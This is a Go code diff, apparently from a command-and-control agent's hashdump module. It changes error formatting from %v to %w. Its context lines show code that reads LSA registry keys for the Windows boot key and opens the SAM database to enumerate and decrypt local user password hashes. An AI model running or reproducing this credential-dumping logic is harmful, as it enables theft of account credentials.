@@ -121,12 +121,12 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 func regOpenKey(root uintptr, path string) (uintptr, error) {
 	pathPtr, err := windows.UTF16PtrFromString(path)
 	if err != nil {
-		return 0, fmt.Errorf("invalid path %q: %v", path, err)
+		return 0, fmt.Errorf("invalid path %q: %w", path, err)
 	}
 	var hKey windows.Handle
 	regerr := windows.RegOpenKeyEx(windows.Handle(root), pathPtr, 0, windows.KEY_READ, &hKey)
 	if regerr != nil {
-		return 0, fmt.Errorf("RegOpenKeyEx(%s): %v", path, regerr)
+		return 0, fmt.Errorf("RegOpenKeyEx(%s): %w", path, regerr)
 	}
 	return uintptr(hKey), nil
 }
@@ -147,7 +147,7 @@ func regQueryClassName(hKey uintptr) (string, error) {
 		0, 0, 0, 0, 0, 0, 0, 0, 0,
 	)
 	if ret != 0 {
-		return "", fmt.Errorf("RegQueryInfoKeyW: %v (code %d)", err, ret)
+		return "", fmt.Errorf("RegQueryInfoKeyW: %w (code %d)", err, ret)
 	}
 	return windows.UTF16ToString(classNameBuf[:classNameLen]), nil
 }
@@ -181,7 +181,7 @@ func regQueryValue(hKey uintptr, valueName string) ([]byte, error) {
 		uintptr(unsafe.Pointer(&dataSize)),
 	)
 	if ret != 0 {
-		return nil, fmt.Errorf("RegQueryValueExW: %v (code %d)", err, ret)
+		return nil, fmt.Errorf("RegQueryValueExW: %w (code %d)", err, ret)
 	}
 	// Guard against dataSize growing between calls (TOCTOU)
 	if dataSize > uint32(len(data)) {
@@ -220,16 +220,16 @@ func extractBootKey() ([]byte, error) {
 		path := fmt.Sprintf(`SYSTEM\CurrentControlSet\Control\Lsa\%s`, keyName)
 		hKey, err := regOpenKey(hkeyLocalMachine, path)
 		if err != nil {
-			return nil, fmt.Errorf("open %s: %v", keyName, err)
+			return nil, fmt.Errorf("open %s: %w", keyName, err)
 		}
 		className, err := regQueryClassName(hKey)
 		regCloseKey(hKey)
 		if err != nil {
-			return nil, fmt.Errorf("class name %s: %v", keyName, err)
+			return nil, fmt.Errorf("class name %s: %w", keyName, err)
 		}
 		decoded, err := hex.DecodeString(className)
 		if err != nil {
-			return nil, fmt.Errorf("decode %s class '%s': %v", keyName, className, err)
+			return nil, fmt.Errorf("decode %s class '%s': %w", keyName, className, err)
 		}
 		scrambled = append(scrambled, decoded...)
 	}
@@ -250,13 +250,13 @@ func extractBootKey() ([]byte, error) {
 func deriveHashedBootKey(bootKey []byte) ([]byte, byte, error) {
 	hKey, err := regOpenKey(hkeyLocalMachine, `SAM\SAM\Domains\Account`)
 	if err != nil {
-		return nil, 0, fmt.Errorf("open SAM Account: %v", err)
+		return nil, 0, fmt.Errorf("open SAM Account: %w", err)
 	}
 	defer regCloseKey(hKey)
 
 	fValue, err := regQueryValue(hKey, "F")
 	if err != nil {
-		return nil, 0, fmt.Errorf("read F value: %v", err)
+		return nil, 0, fmt.Errorf("read F value: %w", err)
 	}
 
 	if len(fValue) < 0x70 {
@@ -281,13 +281,13 @@ func enumerateAndDecryptUsers(hashedBootKey []byte, samRevision byte) ([]userHas
 	usersPath := `SAM\SAM\Domains\Account\Users`
 	hUsersKey, err := regOpenKey(hkeyLocalMachine, usersPath)
 	if err != nil {
-		return nil, fmt.Errorf("open Users key: %v", err)
+		return nil, fmt.Errorf("open Users key: %w", err)
 	}
 	defer regCloseKey(hUsersKey)
 
 	subkeys, err := regEnumSubkeys(hUsersKey)
 	if err != nil {
-		return nil, fmt.Errorf("enum subkeys: %v", err)
+		return nil, fmt.Errorf("enum subkeys: %w", err)
 	}
 
 	var users []userHash
